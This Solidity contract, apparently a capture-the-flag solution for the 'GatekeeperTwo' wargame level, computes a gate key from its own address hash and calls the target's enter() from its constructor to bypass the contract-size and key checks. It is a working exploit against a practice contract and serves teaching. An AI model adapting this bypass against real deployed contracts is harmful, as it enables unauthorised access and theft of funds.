// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "interfaces/Igatekeeper2.sol";

contract AttackGateKeeperTwo {

    IGatekeeperTwo gateKeeperTwo;
    uint64 public gateKey;

    constructor(address _address) {
        gateKeeperTwo = IGatekeeperTwo(_address);
        uint64 gateKey = uint64(bytes8(keccak256(abi.encodePacked(address(this))))) ^ type(uint64).max;
        bool result = gateKeeperTwo.enter(bytes8(gateKey));
    }
}